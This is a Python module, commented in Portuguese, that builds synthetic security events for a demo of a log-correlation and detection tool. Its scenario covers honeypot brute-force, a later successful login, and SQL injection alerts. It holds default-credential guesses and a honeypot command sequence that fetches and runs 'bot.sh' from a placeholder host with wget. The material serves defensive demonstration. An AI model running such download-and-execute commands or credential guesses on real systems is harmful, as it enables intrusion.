"""Gera eventos de exemplo no formato de cada ferramenta, para a demonstração.

A história: o IP 203.0.113.50 faz reconhecimento, ataca o honeypot, baixa payload,
e acaba conseguindo entrar numa conta real. Outros IPs fazem ruído em volta.
"""
import time


def generate(now=None):
    now = now or time.time()
    m = lambda minutes: now - minutes * 60  # noqa: E731
    attacker = "203.0.113.50"
    events = []  # cada item: (source, record)

    # 1. Scanner de rede vê o host (contexto)
    events.append(("netscan", {"ts": m(180), "ip": "192.168.0.10",
                               "open_ports": [{"port": 22}, {"port": 80}, {"port": 3389}]}))

    # 2. O atacante bate no honeypot: tenta senhas
    for i, (u, p) in enumerate([("root", "root"), ("root", "123456"), ("admin", "admin"),
                                ("root", "toor"), ("admin", "password")]):
        events.append(("sshoney", {"event": "login", "ts": m(120) + i * 10, "ip": attacker,
                                   "username": u, "password": p, "success": (u == "admin" and p == "admin")}))
    # 3. Entra no honeypot e tenta baixar um bot
    for i, cmd in enumerate(["uname -a", "wget http://evil.example/bot.sh", "chmod +x bot.sh", "./bot.sh"]):
        events.append(("sshoney", {"event": "command", "ts": m(118) + i * 5, "ip": attacker,
                                   "username": "admin", "command": cmd}))

    # 4. LogWatch detecta força bruta SSH do mesmo IP num servidor real
    events.append(("logwatch", {"ts": m(60), "rule": "ssh_bruteforce", "severity": "high",
                                "ip": attacker, "user": "deploy",
                                "title": f"Força bruta SSH vinda de {attacker}"}))
    # 5. LoginGuard: o mesmo IP consegue um login real (o incidente crítico)
    events.append(("loginguard", {"ts": m(55), "rule": "success_after_failures", "severity": "critical",
                                  "source": attacker, "user": "deploy",
                                  "title": "Login bem-sucedido em 'deploy' após 4 falhas"}))

    # 6. Ataque distribuído a 'admin' por vários IPs (outra história)
    for i, ip in enumerate(["198.51.100.7", "198.51.100.23", "203.0.113.77", "192.0.2.44"]):
        events.append(("loginguard", {"ts": m(40) + i * 3, "rule": "account_bruteforce", "severity": "high",
                                      "source": ip, "user": "admin",
                                      "title": f"Força bruta na conta 'admin' de {ip}"}))

    # 7. Varredura web + ataque do mesmo IP (reconhecimento -> ataque)
    scanner_ip = "45.155.205.9"
    events.append(("logwatch", {"ts": m(35), "rule": "web_scan_404", "severity": "medium",
                                "ip": scanner_ip, "title": "Varredura de diretórios (404)"}))
    events.append(("logwatch", {"ts": m(30), "rule": "web_attack", "severity": "high",
                                "ip": scanner_ip, "title": "Tentativa de SQL injection"}))

    # 8. WebVulnScan achou uma falha (contexto de risco)
    events.append(("webvulnscan", {"severity": "critical", "title": "SQL injection",
                                   "url": "http://192.168.0.10/login", "check": "sqli"}))
    return events
